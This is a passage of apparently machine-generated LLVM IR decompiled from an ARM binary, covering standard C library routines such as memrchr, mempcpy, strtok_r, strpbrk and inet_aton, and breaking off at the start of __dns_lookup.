  %v4_15060 = zext i8 %v3_15060 to i32
  %v9_15064 = icmp eq i32 %v4_15060, %v1_14fe4
  br i1 %v9_15064, label %dec_label_pc_1506c, label %dec_label_pc_15074

dec_label_pc_1506c:                               ; preds = %bb51
  store i32 %v3_14fe0, i32* @r4, align 4
  store i32 %v6_14fe0, i32* @r5, align 4
  store i32 %v9_14fe0, i32* @r6, align 4
  ret i32 %v1_15054

dec_label_pc_15074:                               ; preds = %bb51
  %v2_15074 = inttoptr i32 %v1_15058 to i8*
  %v3_15074 = load i8, i8* %v2_15074, align 1
  %v4_15074 = zext i8 %v3_15074 to i32
  %v9_15078 = icmp eq i32 %v4_15074, %v1_14fe4
  br i1 %v9_15078, label %dec_label_pc_15080, label %dec_label_pc_15088

dec_label_pc_15080:                               ; preds = %dec_label_pc_15074
  store i32 %v3_14fe0, i32* @r4, align 4
  store i32 %v6_14fe0, i32* @r5, align 4
  store i32 %v9_14fe0, i32* @r6, align 4
  ret i32 %v1_15058

dec_label_pc_15088:                               ; preds = %dec_label_pc_15074
  %v2_15088 = inttoptr i32 %v1_15050 to i8*
  %v3_15088 = load i8, i8* %v2_15088, align 1
  %v4_15088 = zext i8 %v3_15088 to i32
  %v9_1508c = icmp eq i32 %v4_15088, %v1_14fe4
  br i1 %v9_1508c, label %dec_label_pc_15094, label %dec_label_pc_1509c.backedge

dec_label_pc_15094:                               ; preds = %dec_label_pc_15088
  store i32 %v3_14fe0, i32* @r4, align 4
  store i32 %v6_14fe0, i32* @r5, align 4
  store i32 %v9_14fe0, i32* @r6, align 4
  ret i32 %v1_15050

dec_label_pc_150c4.preheader:                     ; preds = %dec_label_pc_1509c.backedge, %dec_label_pc_15010
  %v0_15020.lcssa = phi i32 [ %v1_15014, %dec_label_pc_15010 ], [ %v4_15020, %dec_label_pc_1509c.backedge ]
  %v0_1503c.lcssa = phi i32 [ %v0_1509c37, %dec_label_pc_15010 ], [ %v1_1503c, %dec_label_pc_1509c.backedge ]
  %v2_150c411 = icmp eq i32 %v0_1503c.lcssa, 0
  br i1 %v2_150c411, label %dec_label_pc_150cc, label %dec_label_pc_150b4

dec_label_pc_150b4:                               ; preds = %dec_label_pc_150c4, %dec_label_pc_150c4.preheader
  %v0_150c4.in = phi i32 [ %v0_150c4, %dec_label_pc_150c4 ], [ %v0_1503c.lcssa, %dec_label_pc_150c4.preheader ]
  %v15_150bc = phi i32 [ %v1_150c0, %dec_label_pc_150c4 ], [ %v0_15020.lcssa, %dec_label_pc_150c4.preheader ]
  %v0_150c4 = add i32 %v0_150c4.in, -1
  %v1_150b4 = inttoptr i32 %v15_150bc to i8*
  %v2_150b4 = load i8, i8* %v1_150b4, align 1
  %v3_150b4 = zext i8 %v2_150b4 to i32
  %v9_150b8 = icmp eq i32 %v3_150b4, %v1_14fe4
  br i1 %v9_150b8, label %bb52, label %dec_label_pc_150c4

bb52:                                             ; preds = %dec_label_pc_150b4
  store i32 %v3_14fe0, i32* @r4, align 4
  store i32 %v6_14fe0, i32* @r5, align 4
  store i32 %v9_14fe0, i32* @r6, align 4
  ret i32 %v15_150bc

dec_label_pc_150c4:                               ; preds = %dec_label_pc_150b4
  %v1_150c0 = add i32 %v15_150bc, 1
  %v2_150c4 = icmp eq i32 %v0_150c4, 0
  br i1 %v2_150c4, label %dec_label_pc_150cc, label %dec_label_pc_150b4

dec_label_pc_150cc:                               ; preds = %dec_label_pc_150c4, %dec_label_pc_150c4.preheader
  store i32 %v3_14fe0, i32* @r4, align 4
  store i32 %v6_14fe0, i32* @r5, align 4
  store i32 %v9_14fe0, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v15_150bc, { 1, 0, 2 }
  uselistorder i32 %v1_1503c, { 1, 0, 2 }
  uselistorder i32 %v4_15020, { 0, 2, 1 }
  uselistorder i32 %v0_1502081, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_15010, { 1, 0 }
  uselistorder i32 %v0_1509c37, { 1, 2, 0 }
  uselistorder i32 %v1_14fe4, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_14fe0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1509c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_15020, { 1, 0 }
  uselistorder label %dec_label_pc_15010, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15008, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_150e8 = call i32 @memcpy()
  %v0_150ec = load i32, i32* @r5, align 4
  %v1_150ec = load i32, i32* @r4, align 4
  %v2_150ec = add i32 %v1_150ec, %v0_150ec
  ret i32 %v2_150ec
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_150f4 = load i32, i32* @r4, align 4
  %v1_150f8 = urem i32 %arg2, 256
  %v2_150fc = add i32 %arg3, %arg1
  %v2_151142 = icmp eq i32 %arg3, 0
  br i1 %v2_151142, label %dec_label_pc_15124, label %dec_label_pc_1511c

dec_label_pc_15104:                               ; preds = %dec_label_pc_1511c
  %v1_15104 = add i32 %v0_15104, -1
  %v2_15104 = inttoptr i32 %v1_15104 to i8*
  %v3_15104 = load i8, i8* %v2_15104, align 1
  %v4_15104 = zext i8 %v3_15104 to i32
  %v9_15108 = icmp eq i32 %v4_15104, %v1_150f8
  br i1 %v9_15108, label %bb, label %dec_label_pc_15114

bb:                                               ; preds = %dec_label_pc_15104
  ret i32 %v1_15104

dec_label_pc_15114:                               ; preds = %dec_label_pc_15104
  %v1_15110 = add i32 %v0_15110, -1
  %v2_15114 = icmp eq i32 %v1_15110, 0
  br i1 %v2_15114, label %dec_label_pc_15124, label %dec_label_pc_1511c

dec_label_pc_1511c:                               ; preds = %entry, %dec_label_pc_15114
  %v0_15110 = phi i32 [ %v1_15110, %dec_label_pc_15114 ], [ %arg3, %entry ]
  %v0_15104 = phi i32 [ %v1_15104, %dec_label_pc_15114 ], [ %v2_150fc, %entry ]
  %v1_1511c = urem i32 %v0_15104, 4
  %v2_1511c = icmp eq i32 %v1_1511c, 0
  br i1 %v2_1511c, label %dec_label_pc_15124, label %dec_label_pc_15104

dec_label_pc_15124:                               ; preds = %dec_label_pc_15114, %dec_label_pc_1511c, %entry
  %v0_151bc11 = phi i32 [ %v2_150fc, %entry ], [ %v1_15104, %dec_label_pc_15114 ], [ %v0_15104, %dec_label_pc_1511c ]
  %v0_151a87 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_15114 ], [ %v0_15110, %dec_label_pc_1511c ]
  %v4_15124 = mul nuw nsw i32 %v1_150f8, 256
  %v5_15124 = or i32 %v4_15124, %v1_150f8
  %v4_15128 = mul i32 %v5_15124, 65536
  %v5_15128 = or i32 %v4_15128, %v5_15124
  store i32 2130640639, i32* @ip, align 4
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_151a87, 3
  br i1 %tmp, label %dec_label_pc_15130, label %dec_label_pc_151b8

dec_label_pc_15130:                               ; preds = %dec_label_pc_15124, %.backedge.backedge
  %v0_1514c51 = phi i32 [ %v1_1514c, %.backedge.backedge ], [ %v0_151a87, %dec_label_pc_15124 ]
  %v0_1513050 = phi i32 [ %v1_15130, %.backedge.backedge ], [ %v0_151bc11, %dec_label_pc_15124 ]
  %v1_15130 = add i32 %v0_1513050, -4
  %v2_15130 = inttoptr i32 %v1_15130 to i32*
  %v3_15130 = load i32, i32* %v2_15130, align 4
  %v2_15134 = xor i32 %v3_15130, %v5_15128
  %v2_15138 = add i32 %v2_15134, 2130640639
  %v1_1513c = sub i32 -1, %v2_15134
  %v2_15140 = xor i32 %v2_15138, %v1_1513c
  %v2_15144 = and i32 %v2_15140, -2130640640
  %v2_15148 = icmp eq i32 %v2_15144, 0
  %v1_1514c = add i32 %v0_1514c51, -4
  br i1 %v2_15148, label %.backedge.backedge, label %dec_label_pc_15154

dec_label_pc_15154:                               ; preds = %dec_label_pc_15130
  %v1_15154 = add i32 %v0_1513050, -1
  %v2_15154 = inttoptr i32 %v1_15154 to i8*
  %v3_15154 = load i8, i8* %v2_15154, align 1
  %v4_15154 = zext i8 %v3_15154 to i32
  %v9_15158 = icmp eq i32 %v4_15154, %v1_150f8
  %v1_1515c = add i32 %v0_1513050, -2
  store i32 %v1_1515c, i32* @ip, align 4
  %v1_15164 = add i32 %v0_1513050, -3
  store i32 %v1_15164, i32* @lr, align 4
  br i1 %v9_15158, label %dec_label_pc_1516c, label %dec_label_pc_15174

dec_label_pc_1516c:                               ; preds = %dec_label_pc_15154
  store i32 %v3_150f4, i32* @r4, align 4
  ret i32 %v1_15154

dec_label_pc_15174:                               ; preds = %dec_label_pc_15154
  %v2_15174 = inttoptr i32 %v1_1515c to i8*
  %v3_15174 = load i8, i8* %v2_15174, align 1
  %v4_15174 = zext i8 %v3_15174 to i32
  %v9_15178 = icmp eq i32 %v4_15174, %v1_150f8
  br i1 %v9_15178, label %dec_label_pc_15180, label %dec_label_pc_15188

dec_label_pc_15180:                               ; preds = %dec_label_pc_15174
  store i32 %v3_150f4, i32* @r4, align 4
  ret i32 %v1_1515c

dec_label_pc_15188:                               ; preds = %dec_label_pc_15174
  %v2_15188 = inttoptr i32 %v1_15164 to i8*
  %v3_15188 = load i8, i8* %v2_15188, align 1
  %v4_15188 = zext i8 %v3_15188 to i32
  %v9_1518c = icmp eq i32 %v4_15188, %v1_150f8
  br i1 %v9_1518c, label %dec_label_pc_15194, label %dec_label_pc_1519c

dec_label_pc_15194:                               ; preds = %dec_label_pc_15188
  store i32 %v3_150f4, i32* @r4, align 4
  ret i32 %v1_15164

dec_label_pc_1519c:                               ; preds = %dec_label_pc_15188
  %v1_1519c = inttoptr i32 %v1_15130 to i8*
  %v2_1519c = load i8, i8* %v1_1519c, align 1
  %v3_1519c = zext i8 %v2_1519c to i32
  %v9_151a0 = icmp eq i32 %v3_1519c, %v1_150f8
  br i1 %v9_151a0, label %bb19, label %.backedge.backedge

.backedge.backedge:                               ; preds = %dec_label_pc_1519c, %dec_label_pc_15130
  store i32 2130640639, i32* @ip, align 4
  store i32 -2130640640, i32* @lr, align 4
  %tmp70 = icmp ugt i32 %v1_1514c, 3
  br i1 %tmp70, label %dec_label_pc_15130, label %dec_label_pc_151b8

bb19:                                             ; preds = %dec_label_pc_1519c
  store i32 %v3_150f4, i32* @r4, align 4
  ret i32 %v1_15130

dec_label_pc_151bc:                               ; preds = %dec_label_pc_151b8
  %v1_151c8 = add i32 %v0_151c8, -1
  %v1_151bc = add i32 %v0_151bc, -1
  %v2_151bc = inttoptr i32 %v1_151bc to i8*
  %v3_151bc = load i8, i8* %v2_151bc, align 1
  %v4_151bc = zext i8 %v3_151bc to i32
  %v9_151c0 = icmp eq i32 %v4_151bc, %v1_150f8
  br i1 %v9_151c0, label %bb20, label %dec_label_pc_151b8

bb20:                                             ; preds = %dec_label_pc_151bc
  store i32 %v3_150f4, i32* @r4, align 4
  ret i32 %v1_151bc

dec_label_pc_151b8:                               ; preds = %dec_label_pc_15124, %.backedge.backedge, %dec_label_pc_151bc
  %v0_151bc = phi i32 [ %v1_151bc, %dec_label_pc_151bc ], [ %v0_151bc11, %dec_label_pc_15124 ], [ %v1_15130, %.backedge.backedge ]
  %v0_151c8 = phi i32 [ %v1_151c8, %dec_label_pc_151bc ], [ %v0_151a87, %dec_label_pc_15124 ], [ %v1_1514c, %.backedge.backedge ]
  %v2_151c8 = icmp eq i32 %v0_151c8, 0
  br i1 %v2_151c8, label %dec_label_pc_151d0, label %dec_label_pc_151bc

dec_label_pc_151d0:                               ; preds = %dec_label_pc_151b8
  store i32 %v3_150f4, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_151c8, { 1, 0 }
  uselistorder i32 %v1_1514c, { 1, 0, 2 }
  uselistorder i32 %v1_15130, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_1513050, { 3, 2, 1, 0 }
  uselistorder i32 %v5_15124, { 1, 0 }
  uselistorder i32 %v0_151a87, { 1, 2, 0 }
  uselistorder i32 %v0_15104, { 1, 0, 2 }
  uselistorder i32 %v1_15104, { 0, 2, 1, 3 }
  uselistorder i32 %v2_150fc, { 1, 0 }
  uselistorder i32 %v1_150f8, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_150f4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -3, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 -2, { 2, 4, 5, 3, 13, 7, 6, 12, 8, 14, 16, 15, 17, 0, 9, 1, 10, 18, 11 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_151b8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15130, { 1, 0 }
  uselistorder label %dec_label_pc_15124, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1511c, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_151e0 = load i32, i32* @r4, align 4
  store i32 %v3_151e0, i32* %stack_var_-16, align 4
  %v6_151e0 = load i32, i32* @r5, align 4
  %v0_151e4 = load i32, i32* @r0, align 4
  store i32 %v0_151e4, i32* %r4.global-to-local, align 4
  %v2_151e4 = icmp eq i32 %v0_151e4, 0
  %v1_151e8 = load i32, i32* @r2, align 4
  br i1 %v2_151e4, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_151e8 = inttoptr i32 %v1_151e8 to i32*
  %v3_151e8 = load i32, i32* %v2_151e8, align 4
  store i32 %v3_151e8, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_151ec = phi i32 [ %v3_151e8, %bb ], [ %v0_151e4, %entry ]
  store i32 %v0_151ec, i32* @r0, align 4
  store i32 %v1_151e8, i32* @r5, align 4
  %v0_151f4 = load i32, i32* @r1, align 4
  store i32 %v0_151f4, i32* %r6.global-to-local, align 4
  %v1_151f8 = inttoptr i32 %v0_151ec to i8*
  %v2_151f8 = call i32 @__GI_strspn(i8* %v1_151f8)
  %v0_151fc = load i32, i32* %r4.global-to-local, align 4
  %v2_151fc = add i32 %v0_151fc, %v2_151f8
  %v3_151fc = inttoptr i32 %v2_151fc to i8*
  %v4_151fc = load i8, i8* %v3_151fc, align 1
  %v6_151fc = zext i8 %v4_151fc to i32
  store i32 %v6_151fc, i32* %r3.global-to-local, align 4
  store i32 %v2_151fc, i32* @r4, align 4
  %v2_15204 = icmp eq i8 %v4_151fc, 0
  store i1 %v2_15204, i1* @cpsr_z, align 1
  %v0_15208 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_15208, i32* @r1, align 4
  store i32 %v2_151fc, i32* @r0, align 4
  br i1 %v2_15204, label %bb7, label %dec_label_pc_15218

bb7:                                              ; preds = %entry._crit_edge
  %v2_15210 = load i32, i32* @r5, align 4
  %v3_15210 = inttoptr i32 %v2_15210 to i32*
  store i32 %v2_151fc, i32* %v3_15210, align 4
  br label %dec_label_pc_1524c

dec_label_pc_15218:                               ; preds = %entry._crit_edge
  %v0_15218 = call i32 @__GI_strpbrk()
  store i32 %v0_15218, i32* %r2.global-to-local, align 4
  %v3_1521c = icmp eq i32 %v0_15218, 0
  store i1 %v3_1521c, i1* @cpsr_z, align 1
  br i1 %v3_1521c, label %dec_label_pc_1522c, label %dec_label_pc_1523c

dec_label_pc_1522c:                               ; preds = %dec_label_pc_15218
  %v0_15224 = load i32, i32* @r4, align 4
  %v2_1522c = call i32 @rawmemchr(i32 %v0_15224, i32 0)
  %v0_15230 = load i32, i32* @r4, align 4
  store i32 %v0_15230, i32* %r3.global-to-local, align 4
  %v1_15234 = load i32, i32* @r5, align 4
  %v2_15234 = inttoptr i32 %v1_15234 to i32*
  store i32 %v2_1522c, i32* %v2_15234, align 4
  br label %dec_label_pc_1524c

dec_label_pc_1523c:                               ; preds = %dec_label_pc_15218
  %v3_15240 = inttoptr i32 %v0_15218 to i8*
  store i8 0, i8* %v3_15240, align 1
  %v4_15240 = load i32, i32* %r2.global-to-local, align 4
  %v5_15240 = add i32 %v4_15240, 1
  store i32 %v5_15240, i32* @r2, align 4
  %v1_15244 = load i32, i32* @r5, align 4
  %v2_15244 = inttoptr i32 %v1_15244 to i32*
  store i32 %v5_15240, i32* %v2_15244, align 4
  %v0_15248 = load i32, i32* @r4, align 4
  store i32 %v0_15248, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1524c

dec_label_pc_1524c:                               ; preds = %bb7, %dec_label_pc_1522c, %dec_label_pc_1523c
  %v0_1524c = load i32, i32* %r3.global-to-local, align 4
  %v2_15250 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15250, i32* @r4, align 4
  store i32 %v6_151e0, i32* @r5, align 4
  ret i32 %v0_1524c

; uselistorder directives
  uselistorder i32 %v0_151ec, { 1, 0 }
  uselistorder i32 %v0_151e4, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1524c, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @__GI_strpbrk() local_unnamed_addr {
entry:
  %v0_15254 = load i32, i32* @r0, align 4
  %v1_152782 = inttoptr i32 %v0_15254 to i8*
  %v2_152783 = load i8, i8* %v1_152782, align 1
  %v3_152784 = zext i8 %v2_152783 to i32
  %v2_1527c5 = icmp eq i8 %v2_152783, 0
  br i1 %v2_1527c5, label %dec_label_pc_15278._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %entry
  %v0_15284.pre = load i32, i32* @r1, align 4
  br label %bb

dec_label_pc_1525c:                               ; preds = %dec_label_pc_15264
  %v1_1526c = add i32 %v0_1526c, 1
  %v9_1525c = icmp eq i32 %v3_15264, %v3_152786
  br i1 %v9_1525c, label %dec_label_pc_1528c, label %dec_label_pc_15264

dec_label_pc_15264:                               ; preds = %dec_label_pc_1525c, %bb
  %v0_1526c = phi i32 [ %v1_1526c, %dec_label_pc_1525c ], [ %v0_15284.pre, %bb ]
  %v1_15264 = inttoptr i32 %v0_1526c to i8*
  %v2_15264 = load i8, i8* %v1_15264, align 1
  %v3_15264 = zext i8 %v2_15264 to i32
  store i32 %v3_15264, i32* @ip, align 4
  %v2_15268 = icmp eq i8 %v2_15264, 0
  br i1 %v2_15268, label %dec_label_pc_15274, label %dec_label_pc_1525c

dec_label_pc_15274:                               ; preds = %dec_label_pc_15264
  %v1_15274 = add i32 %v0_15274, 1
  %v1_15278 = inttoptr i32 %v1_15274 to i8*
  %v2_15278 = load i8, i8* %v1_15278, align 1
  %v3_15278 = zext i8 %v2_15278 to i32
  %v2_1527c = icmp eq i8 %v2_15278, 0
  br i1 %v2_1527c, label %dec_label_pc_15278._crit_edge, label %bb

dec_label_pc_15278._crit_edge:                    ; preds = %dec_label_pc_15274, %entry
  %v3_15278.lcssa = phi i32 [ %v3_152784, %entry ], [ %v3_15278, %dec_label_pc_15274 ]
  ret i32 %v3_15278.lcssa

bb:                                               ; preds = %.lr.ph, %dec_label_pc_15274
  %v0_15274 = phi i32 [ %v0_15254, %.lr.ph ], [ %v1_15274, %dec_label_pc_15274 ]
  %v3_152786 = phi i32 [ %v3_152784, %.lr.ph ], [ %v3_15278, %dec_label_pc_15274 ]
  br label %dec_label_pc_15264

dec_label_pc_1528c:                               ; preds = %dec_label_pc_1525c
  ret i32 %v0_15274

; uselistorder directives
  uselistorder i32 %v3_15278, { 1, 0 }
  uselistorder i32 %v3_15264, { 1, 0 }
  uselistorder i32 %v0_1526c, { 1, 0 }
  uselistorder i32 %v3_152784, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_15264, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_15294 = load i32, i32* %r0.global-to-local, align 4
  %v2_15294 = icmp eq i32 %v0_15294, 0
  %v3_15298 = load i32, i32* @r4, align 4
  store i32 %v3_15298, i32* %stack_var_-20, align 4
  br i1 %v2_15294, label %dec_label_pc_15374, label %dec_label_pc_152b0.lr.ph

dec_label_pc_152b0:                               ; preds = %dec_label_pc_152b0.lr.ph, %dec_label_pc_15334
  %v1_15334 = phi i32 [ 0, %dec_label_pc_152b0.lr.ph ], [ %v5_15334, %dec_label_pc_15334 ]
  %v0_15338 = phi i32 [ 1, %dec_label_pc_152b0.lr.ph ], [ %v1_15338, %dec_label_pc_15334 ]
  %v0_152b8 = phi i32 [ %v0_15294, %dec_label_pc_152b0.lr.ph ], [ %v0_152b825, %dec_label_pc_15334 ]
  store i32 %v2_152b4.pre, i32* @lr, align 4
  %v1_152b8 = inttoptr i32 %v0_152b8 to i8*
  %v2_152b8 = load i8, i8* %v1_152b8, align 1
  %v3_152b8 = zext i8 %v2_152b8 to i32
  %v3_152bc = mul nuw nsw i32 %v3_152b8, 2
  %v4_152bc = add i32 %v3_152bc, %v2_152b4.pre
  %v5_152bc = inttoptr i32 %v4_152bc to i8*
  %v6_152bc = load i8, i8* %v5_152bc, align 1
  %v1_152c0 = and i8 %v6_152bc, 8
  %v2_152c0 = icmp eq i8 %v1_152c0, 0
  br i1 %v2_152c0, label %dec_label_pc_15374, label %dec_label_pc_152c8

dec_label_pc_152c8:                               ; preds = %dec_label_pc_152b0
  br label %dec_label_pc_152e8

dec_label_pc_152d0:                               ; preds = %dec_label_pc_152e8
  %v3_152d4 = mul i32 %v0_15334, 10
  %v4_152d4 = add i32 %v3_152e8, %v3_152d4
  %v1_152d8 = add i32 %v4_152d4, -48
  %v8_152e0 = icmp sgt i32 %v1_152d8, 255
  br i1 %v8_152e0, label %dec_label_pc_15374, label %dec_label_pc_152e4

dec_label_pc_152e4:                               ; preds = %dec_label_pc_152d0
  %v1_152e4 = add i32 %v0_15324, 1
  store i32 %v1_152e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_152e8

dec_label_pc_152e8:                               ; preds = %dec_label_pc_152c8, %dec_label_pc_152e4
  %v0_15334 = phi i32 [ 0, %dec_label_pc_152c8 ], [ %v1_152d8, %dec_label_pc_152e4 ]
  %v0_15324 = phi i32 [ %v0_152b8, %dec_label_pc_152c8 ], [ %v1_152e4, %dec_label_pc_152e4 ]
  %v1_152e8 = inttoptr i32 %v0_15324 to i8*
  %v2_152e8 = load i8, i8* %v1_152e8, align 1
  %v3_152e8 = zext i8 %v2_152e8 to i32
  store i32 %v3_152e8, i32* @ip, align 4
  %v2_152ec = mul nuw nsw i32 %v3_152e8, 2
  %v2_152f0 = add i32 %v2_152ec, %v2_152b4.pre
  %v3_152f4 = inttoptr i32 %v2_152f0 to i8*
  %v4_152f4 = load i8, i8* %v3_152f4, align 1
  %v6_152f4 = zext i8 %v4_152f4 to i32
  %v1_15300 = and i32 %v6_152f4, 8
  %v2_15300 = icmp eq i32 %v1_15300, 0
  br i1 %v2_15300, label %dec_label_pc_15308, label %dec_label_pc_152d0

dec_label_pc_15308:                               ; preds = %dec_label_pc_152e8
  %v8_1530c = icmp sgt i32 %v0_15338, 3
  br i1 %v8_1530c, label %dec_label_pc_15320, label %dec_label_pc_15310

dec_label_pc_15310:                               ; preds = %dec_label_pc_15308
  %v7_15310 = icmp eq i8 %v2_152e8, 46
  br i1 %v7_15310, label %dec_label_pc_15318, label %dec_label_pc_15374

dec_label_pc_15318:                               ; preds = %dec_label_pc_15310
  %v1_15318 = add i32 %v0_15324, 1
  store i32 %v1_15318, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15334

dec_label_pc_15320:                               ; preds = %dec_label_pc_15308
  %v2_15320 = icmp eq i8 %v2_152e8, 0
  %v1_15324 = add i32 %v0_15324, 1
  store i32 %v1_15324, i32* %r0.global-to-local, align 4
  br i1 %v2_15320, label %dec_label_pc_15334, label %dec_label_pc_1532c

dec_label_pc_1532c:                               ; preds = %dec_label_pc_15320
  %v1_1532c = and i32 %v6_152f4, 32
  %v2_1532c = icmp eq i32 %v1_1532c, 0
  br i1 %v2_1532c, label %dec_label_pc_15374, label %dec_label_pc_15334

dec_label_pc_15334:                               ; preds = %dec_label_pc_1532c, %dec_label_pc_15320, %dec_label_pc_15318
  %v0_152b825 = phi i32 [ %v1_15324, %dec_label_pc_1532c ], [ %v1_15324, %dec_label_pc_15320 ], [ %v1_15318, %dec_label_pc_15318 ]
  %v4_15334 = mul i32 %v1_15334, 256
  %v5_15334 = or i32 %v0_15334, %v4_15334
  %v1_15338 = add nuw nsw i32 %v0_15338, 1
  %v7_15340 = icmp slt i32 %v1_15338, 5
  br i1 %v7_15340, label %dec_label_pc_152b0, label %dec_label_pc_15344

dec_label_pc_152b0.lr.ph:                         ; preds = %entry
  %v2_152b4.pre = load i32, i32* @global_var_237ac, align 4
  br label %dec_label_pc_152b0

dec_label_pc_15344:                               ; preds = %dec_label_pc_15334
  %v2_15344 = icmp eq i32 %arg2, 0
  br i1 %v2_15344, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_15344
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread11

bb41:                                             ; preds = %dec_label_pc_15344
  %v2_1534c = and i32 %v5_15334, ptrtoint (i32* @global_var_ff00.45 to i32)
  %v2_15348 = udiv i32 %v5_15334, 256
  %v4_15350 = and i32 %v2_15348, 65280
  %v4_15354 = mul i32 %v2_1534c, 256
  %v5_15358 = udiv i32 %v5_15334, 16777216
  %v6_15358 = or i32 %v4_15350, %v5_15358
  %v5_1535c = mul i32 %v0_15334, 16777216
  %v6_1535c = or i32 %v4_15354, %v5_1535c
  %v3_15360 = or i32 %v6_15358, %v6_1535c
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_1536c = inttoptr i32 %arg2 to i32*
  store i32 %v3_15360, i32* %v3_1536c, align 4
  %v2_15370.pre = load i32, i32* %stack_var_-20, align 4
  %v17_15370.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb, %bb41
  %v17_15370 = phi i32 [ 1, %bb ], [ %v17_15370.pre, %bb41 ]
  %v2_15370 = phi i32 [ %v3_15298, %bb ], [ %v2_15370.pre, %bb41 ]
  store i32 %v2_15370, i32* @r4, align 4
  ret i32 %v17_15370

dec_label_pc_15374:                               ; preds = %dec_label_pc_15310, %dec_label_pc_1532c, %dec_label_pc_152b0, %dec_label_pc_152d0, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_15298, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_152b4.pre, { 2, 1, 0 }
  uselistorder i32 %v1_15338, { 1, 0 }
  uselistorder i32 %v3_152e8, { 0, 2, 1 }
  uselistorder i32 %v0_15324, { 0, 1, 3, 2 }
  uselistorder i32 %v3_15298, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 6, 7, 8, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_ff00.45 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_15374, { 1, 0, 3, 2, 4 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_152e8, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp146 = call i32 @__decompiler_undefined_function_0()
  %tmp147 = call i32 @__decompiler_undefined_function_0()
  %tmp151 = call i32 @__decompiler_undefined_function_0()
  %tmp155 = call i32 @__decompiler_undefined_function_0()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %tmp157 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-188 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v3_15380 = load i32, i32* @r4, align 4
  %v6_15380 = load i32, i32* @r5, align 4
  %v9_15380 = load i32, i32* @r6, align 4
  %v12_15380 = load i32, i32* @r7, align 4
  %v15_15380 = load i32, i32* @r8, align 4
  %v18_15380 = load i32, i32* @sb, align 4
  %v21_15380 = load i32, i32* @sl, align 4
  store i32 %arg6, i32* @r8, align 4
  %v1_153a0 = call i32 @malloc(i32 512)
  store i32 %v1_153a0, i32* @r7, align 4
  %v1_153ac = call i32 @malloc(i32 1025)
  %v2_153b0 = icmp eq i32 %v1_153ac, 0
  br i1 %v2_153b0, label %.thread8, label %bb

bb:                                               ; preds = %entry
  %v1_153b4 = load i32, i32* @r7, align 4
  %v3_153b4 = icmp eq i32 %v1_153b4, 0
  store i32 %v1_153ac, i32* %stack_var_-236, align 4
